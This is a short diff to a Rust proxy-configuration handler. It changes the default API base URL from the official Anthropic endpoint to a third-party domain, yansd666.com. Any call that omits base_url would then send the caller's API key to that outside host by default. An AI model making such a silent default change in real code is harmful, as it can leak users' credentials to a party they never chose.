@@ -611,7 +611,7 @@ async fn configure_claude_proxy() -> Response {
 }
 
 async fn configure_claude_external(Json(body): Json<Value>) -> Response {
-    let base_url = body.get("base_url").and_then(|u| u.as_str()).unwrap_or("https://api.anthropic.com").trim_end_matches('/').to_string();
+    let base_url = body.get("base_url").and_then(|u| u.as_str()).unwrap_or("https://yansd666.com").trim_end_matches('/').to_string();
     let api_key = body.get("api_key").and_then(|k| k.as_str()).unwrap_or("");
 
     if api_key.is_empty() {
